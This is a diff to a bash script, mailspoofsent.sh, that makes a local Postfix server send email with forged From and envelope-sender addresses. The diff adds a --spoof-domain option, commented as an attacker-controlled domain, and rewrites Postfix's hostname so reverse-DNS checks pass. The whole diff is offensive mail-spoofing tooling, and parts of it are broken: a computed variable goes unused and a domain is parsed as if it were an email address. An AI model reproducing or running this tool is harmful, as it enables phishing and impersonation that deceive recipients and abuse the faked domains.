@@ -32,6 +32,20 @@ if ! dpkg -s postfix &> /dev/null; then
   sudo systemctl start postfix
 fi
 
+# check the status of the postfix service
+status=$(systemctl status postfix)
+
+# check if the postfix service is active
+if [[ "$status" == *"active"* ]]; then
+  # postfix is active, so let the user know
+  echo "Postfix is already started, ready to start..."
+else
+  # postfix is inactive, so start it
+  systemctl start postfix
+
+  # let the user know that postfix was started
+  echo "Postfix has been started..."
+fi
 
 # show usage if no arguments are provided
 if [ $# -eq 0 ]; then
@@ -44,7 +58,7 @@ while [[ $# -gt 0 ]]; do
   key="$1"
   case $key in
     -h|--help)
-      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body"
+      echo "Usage: ./mailspoofsent.sh [--bcc bcc_address] --mail-from mail_from --mail-to mail_to --mail-envelope mail_envelope --subject subject --body body [--spoof-domain domain]"
       echo ""
       echo "Options:"
       echo "  --bcc bcc_address   Specify a bcc address for the email"
@@ -53,6 +67,7 @@ while [[ $# -gt 0 ]]; do
       echo "  --mail-envelope     The envelope sender for the email"
       echo "  --subject           The subject of the email"
       echo "  --body              The body of the email"
+      echo "  --spoof-domain      The domain to spoof from"
       exit
       ;;
     --bcc)
@@ -85,16 +100,25 @@ while [[ $# -gt 0 ]]; do
       shift
       shift
       ;;
+    --spoof-domain)
+      spoof_domain="$2"
+      shift
+      shift
+      ;;
     *)
       shift
       ;;
   esac
 done
 
+
 # Fake domainname in Postfix configuration
 MAIL_FROM_DOMAIN=$(echo $mail_from | awk -F@ '{print $2}')
+# Domain spoofing from should be under control of attacker.
+SPOOF_DOMAIN=$(echo $spoof_domain | awk -F@ '{print $2}')
+echo "Updating hostname to $spoof_domain so PTR record lookup is for domain under control..."
+sudo sed -i "s/^myhostname =.*/myhostname = $spoof_domain/" /etc/postfix/main.cf
 echo "Updating Postfix configuration..."
-sudo sed -i "s/^myhostname =.*/myhostname = $MAIL_FROM_DOMAIN/" /etc/postfix/main.cf
 sed -i "s/^mydestination =.*/mydestination = $myhostname, $MAIL_FROM_DOMAIN, localhost.localdomain, , localhost/" /etc/postfix/main.cf
 sudo systemctl restart postfix
 
@@ -112,8 +136,10 @@ mail_headers=$(echo $mail_headers | sed "s/example.com/$domain/")
 # send the email using the mail command
 echo "Sending email..."
 if [ -z "$bcc_address" ]; then
+  body="<html>$body</html>"
   mail -s "$subject" -r "$mail_from" -a "Content-Type: text/html" -a "Envelope-From: $mail_envelope" "$mail_headers" "$mail_to" <<< "$body"
 else
+  body="<html>$body</html>"
   mail -s "$subject" -r "$mail_from" -a "Content-Type: text/html" -a "Envelope-From: $mail_envelope" -b "$bcc_address" "$mail_headers" "$mail_to" <<< "$body"
 fi
 
